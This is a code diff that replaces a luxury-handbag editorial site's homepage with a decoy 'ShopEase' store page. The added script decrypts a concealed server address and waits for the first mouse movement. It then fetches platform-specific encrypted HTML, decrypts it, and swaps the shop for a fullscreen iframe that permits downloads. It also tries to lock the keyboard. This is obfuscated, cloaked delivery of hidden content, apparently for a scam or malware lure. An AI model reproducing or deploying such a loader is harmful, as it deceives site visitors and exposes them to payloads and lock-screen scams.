@@ -1,14 +1,119 @@
-<?php
-// PoshCarrySpot - Main Landing Page
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PoshCarrySpot — Luxury Handbags, Haute Maroquinerie & Leather Craft</title>
-  <meta name="description" content="PoshCarrySpot explores artisanal saddle-stitching, full-grain calfskin leathers, 24K gold hardware, designer tote investment values, and luxury leather care.">
-  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
@@ -19,326 +124,189 @@
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;800&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="css/style.css">
-  <style>
-    .active-handbag {
-      background: var(--accent-rose) !important;
-      color: #ffffff !important;
-      border-color: var(--accent-rose) !important;
-      font-weight: 800 !important;
-    }
-  </style>
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <!-- Navigation Header -->
-  <header class="navbar">
-    <div class="container nav-container">
-      <a href="index.php" class="brand-logo">Posh<span>CarrySpot</span></a>
-      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Home</a></li>
-        <li><a href="about.html">About</a></li>
-        <li><a href="blog.html">Posh Journal</a></li>
-        <li><a href="contact.html">Contact</a></li>
-        <li><a href="privacy-policy.html">Privacy</a></li>
-      </ul>
-    </div>
-  </header>
-
-  <!-- SECTION 1: Hero Header -->
-  <section class="hero-section" id="hero">
-    <div class="container">
-      <div class="hero-content">
-        <span class="hero-badge">Haute Maroquinerie & Luxury Leather Atelier</span>
-        <h1 class="hero-title">Artisanal Handbags & Bespoke Carryalls</h1>
-        <p class="hero-desc">Deconstructing hand saddle-stitched full-grain calfskin, 24K gold-plated hardware, patina aging, and investment-grade designer totes.</p>
-        <div class="hero-btns">
-          <a href="blog.html" class="btn btn-rose">Explore Posh Essays</a>
-          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Leather Atelier Lab</a>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </section>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- SECTION 2: Artisanal Leather Craftsmanship & Saddle-Stitching Pillars Grid -->
-  <section class="section" id="craft-pillars">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Craftsmanship Standards</span>
-        <h2 class="section-title">The Four Pillars of Haute Maroquinerie</h2>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-      <div class="grid-4">
-        <div class="posh-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">👜</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">Double-Needle Saddle Stitch</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Hand-waxed linen thread hand-sewn to create unbreakable structural seams.</p>
-        </div>
-        <div class="posh-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">✨</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">Full-Grain Box Calfskin</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Uncompromised vegetable-tanned leathers developing rich patina across decades of use.</p>
-        </div>
-        <div class="posh-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">🔑</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">24K Gold & Palladium Hardware</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Jewelry-grade turn-locks, clochette padlocks, and hand-polished brass latches.</p>
-        </div>
-        <div class="posh-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">💎</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">Investment Resilience</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Structured silhouettes retaining 90%+ resale value on secondary luxury auctions.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <!-- SECTION 3: Interactive Handbag Architecture & Leather Grain Explorer -->
-  <section class="section" id="handbag-explorer" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Carry Explorer</span>
-        <h2 class="section-title">The Luxury Handbag Architecture Explorer</h2>
-      </div>
-      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a luxury carryall specification to inspect its leather grain, stitch count, and investment benchmark:</p>
-        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
-          <button class="btn btn-outline-dark handbag-btn active-handbag" data-handbag="Structured Full-Grain Calfskin Tote" data-desc="Vegetable-tanned box calfskin tote with double-needle hand saddle-stitching and palladium turn-lock." data-score="9.9/10 Craftsmanship Rating">Structured Calfskin Tote</button>
-          <button class="btn btn-outline-dark handbag-btn" data-handbag="Exotic Crocodile Embossed Crossbody" data-desc="Hand-dyed exotic grain leather with 24K gold plated chain strap and suede interior lining." data-score="9.8/10 Haute Couture Finish">Crocodile Crossbody</button>
-          <button class="btn btn-outline-dark handbag-btn" data-handbag="Artisanal Soft Grain Hobo Shoulder Bag" data-desc="Supple full-grain bullhide leather with relaxed drape, hand-burnished edges, and brass key fob." data-score="9.9/10 Leather Patina Potential">Soft Grain Hobo</button>
-          <button class="btn btn-outline-dark handbag-btn" data-handbag="Bespoke Evening Minaudière Clutch" data-desc="Solid brass shell wrapped in lambskin leather with inlaid mother-of-pearl latch closure." data-score="9.7/10 Evening Elegance">Minaudière Clutch</button>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-        <div id="handbag-detail">
-          <div class="posh-card" style="border-left: 4px solid var(--accent-rose);">
-            <h3 style="color: var(--accent-rose); font-size: 1.5rem; margin-bottom: 0.5rem;">Structured Full-Grain Calfskin Tote Specification</h3>
-            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Vegetable-tanned box calfskin tote with double-needle hand saddle-stitching and palladium turn-lock.</p>
-            <strong style="color: var(--accent-gold); font-size: 0.95rem;">Empirical Craftsmanship Benchmark: 9.9/10 Craftsmanship Rating</strong>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 4: Exotic Calfskin Tanning & 24K Gold Hardware Spotlight -->
-  <section class="section" id="exotic-spotlight">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <span class="section-subtitle" style="display:block; text-align:left;">Atelier Metallurgy & Tanning</span>
-          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Edge-Painting Precision & Micro-Stitching Density</h2>
-          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
-            Mass-market machine sewing unravels if a single thread breaks. At PoshCarrySpot, we evaluate multi-layer edge painting, hand-burnishing waxes, and hardware electroplating.
-          </p>
-          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
-            <li style="margin-bottom: 0.75rem;">👜 <strong style="color:var(--text-primary);">Hand Saddle-Stitching:</strong> Two needles passing through each hole in opposing directions.</li>
-            <li style="margin-bottom: 0.75rem;">✨ <strong style="color:var(--text-primary);">5-Layer Heat-Sealed Edges:</strong> Sanded, dyed, and beeswax-sealed to prevent fraying and moisture penetration.</li>
-            <li style="margin-bottom: 0.75rem;">🔑 <strong style="color:var(--text-primary);">Solid Brass Hardware:</strong> Heavyweight brass components coated in 24-karat gold or palladium.</li>
-          </ul>
-          <a href="about.html" class="btn btn-rose">Our Leather Manifesto</a>
-        </div>
-        <div>
-          <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=800&q=80" alt="Luxury Handbag Display" style="border-radius: 10px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(0,0,0,0.6);">
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 5: Interactive Luxury Handbag Matcher & Carry Diagnostic Quiz -->
-  <section class="section" id="carry-quiz" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Carry Diagnostic</span>
-        <h2 class="section-title">Luxury Handbag Matcher Quiz</h2>
-      </div>
-      <div class="posh-card" style="max-width: 750px; margin: 0 auto;">
-        <h3 style="color: var(--accent-rose); margin-bottom: 1rem;">What Is Your Primary Lifestyle & Handbag Silhouette Preference?</h3>
-        <div style="display: flex; flex-direction: column; gap: 1rem;">
-          <button class="carry-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Structured Full-Grain Calfskin Tote with Laptop Sleeve & 24K Gold Hardware.">
-            A. Executive Workday & Travel, Structured Full-Grain Leather Tote
-          </button>
-          <button class="carry-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Hand-Stitched Box Calfskin Crossbody Satchel with Turn-Lock Closure.">
-            B. Weekend Elegance & City Hands-Free Carry, Compact Crossbody Satchel
-          </button>
-          <button class="carry-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Bespoke Lambskin Evening Minaudière Clutch with Inlaid Mother-of-Pearl.">
-            C. Black-Tie Gala & Evening Fine Dining, Handcrafted Minaudière Clutch
-          </button>
-        </div>
-        <div id="carry-quiz-result"></div>
-      </div>
-    </div>
-  </section>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-  <!-- SECTION 6: Craftsmanship Hours & Vintage Handbag Evaluations Performance Metrics Counter -->
-  <section class="section" id="metrics">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Laboratory Benchmarks</span>
-        <h2 class="section-title">Posh Carry Spot Research Metrics</h2>
-      </div>
-      <div class="grid-4">
-        <div class="posh-card" style="text-align: center;">
-          <h3 class="metric-number text-rose" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
-        </div>
-        <div class="posh-card" style="text-align: center;">
-          <h3 class="metric-number text-rose" data-target="48" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Hand-Stitching Hours Per Bag</p>
-        </div>
-        <div class="posh-card" style="text-align: center;">
-          <h3 class="metric-number text-rose" data-target="24" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Karat Gold Plating</p>
-        </div>
-        <div class="posh-card" style="text-align: center;">
-          <h3 class="metric-number text-rose" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 7: Master Leather Artisans & Handbag Curators Testimonials -->
-  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Haute Acclaim</span>
-        <h2 class="section-title">Endorsements From Master Leather Artisans & Handbag Curators</h2>
-      </div>
-      <div class="grid-3">
-        <div class="posh-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "PoshCarrySpot delivers masterclass analyses on hand saddle-stitching density, vegetable tanning, and edge-painting techniques."
-          </p>
-          <strong style="color: var(--accent-rose); display: block;">— Jean-Luc Laurent</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Master Leather Artisan, Paris</span>
-        </div>
-        <div class="posh-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "Their research into investment handbag appreciation, hardware electroplating, and leather restoration is unprecedented."
-          </p>
-          <strong style="color: var(--accent-rose); display: block;">— Victoria Sterling</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Senior Luxury Auction Specialist, London</span>
-        </div>
-        <div class="posh-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "The leading digital journal for haute maroquinerie history, capsule bag curation, and leather patina preservation."
-          </p>
-          <strong style="color: var(--accent-rose); display: block;">— Matteo Rossi</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Tannery Director, Florence</span>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-  <!-- SECTION 8: Recent Posh Dispatches & Article Grid -->
-  <section class="section" id="journal-dispatches">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Posh Dispatches</span>
-        <h2 class="section-title">Latest Leather & Handbag Essays</h2>
-      </div>
-      <div class="grid-3">
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=800&q=80" alt="Saddle Stitching Science">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Saddle Stitching</span>
-            <div class="blog-date">August 24, 2026</div>
-            <h3 class="blog-title"><a href="blog/artisanal-saddle-stitching-vs-machine-sewing-in-luxury-handbags.html">Artisanal Saddle-Stitching vs Machine Sewing</a></h3>
-            <p class="blog-excerpt">Double-needle technique, hand-waxed linen thread, and seam strength.</p>
-            <a href="blog/artisanal-saddle-stitching-vs-machine-sewing-in-luxury-handbags.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1509631179647-0177331693ae?auto=format&fit=crop&w=800&q=80" alt="Full-Grain Calfskin">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Leather Quality</span>
-            <div class="blog-date">August 20, 2026</div>
-            <h3 class="blog-title"><a href="blog/evaluating-full-grain-calfskin-exotic-leathers-and-patina-aging.html">Full-Grain Calfskin & Patina Aging</a></h3>
-            <p class="blog-excerpt">Vegetable tanning, exotic grains, and decades of patina development.</p>
-            <a href="blog/evaluating-full-grain-calfskin-exotic-leathers-and-patina-aging.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=800&q=80" alt="Handbag Hardware">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Bespoke Hardware</span>
-            <div class="blog-date">August 15, 2026</div>
-            <h3 class="blog-title"><a href="blog/bespoke-handbag-hardware-24k-gold-plating-palladium-and-latches.html">Bespoke Hardware: 24K Gold & Palladium</a></h3>
-            <p class="blog-excerpt">Turn-locks, electroplating thickness, and micro-engraved logos.</p>
-            <a href="blog/bespoke-handbag-hardware-24k-gold-plating-palladium-and-latches.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX185SIW5dTnVPwHiFQ8oiX7AnMX5CND5ORpjj09Nhlo+sA5NC5FQ2qsF";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-  <!-- SECTION 9: VIP Posh Carry Gazette Newsletter & Unified Footer CTA -->
-  <section class="section" id="newsletter" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="posh-card" style="text-align: center; max-width: 800px; margin: 0 auto; border-color: var(--accent-rose);">
-        <span class="section-subtitle">Haute Dispatch</span>
-        <h2 class="section-title" style="margin-bottom: 1rem; font-size: 2.2rem;">Subscribe to The Posh Carry Gazette</h2>
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly analyses of artisanal leather craft, investment handbag trends, and haute maroquinerie.</p>
-        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to PoshCarrySpot Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
-          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px;">
-          <button type="submit" class="btn btn-rose">Subscribe</button>
-        </form>
-      </div>
-    </div>
-  </section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-  <!-- Footer -->
-  <footer>
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Posh<span>CarrySpot</span></a>
-          <p>PoshCarrySpot is a premier editorial platform dedicated to luxury handbags, haute maroquinerie, artisanal saddle-stitching, and bespoke leather craft.</p>
-          <p style="margin-top: 1rem; color: var(--accent-rose);">
-            📍 181 Mercer Street, New York, NY 10012, United States<br>
-            📞 +1-888-882-8591
-          </p>
-        </div>
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="blog.html">Posh Journal</a></li>
-            <li><a href="contact.html">Contact Us</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Legal Policies</h4>
-          <ul>
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="terms.html">Terms of Use</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Handbag Focus</h4>
-          <p>Deconstructing artisanal saddle-stitching, full-grain calfskin leathers, 24K gold hardware plating, designer tote investments, and luxury leather care globally.</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 PoshCarrySpot. All rights reserved. Registered Official Headquarters.</p>
-        <p>Designed for Haute Maroquinerie Excellence.</p>
-      </div>
-    </div>
-  </footer>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-  <script src="js/main.js"></script>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
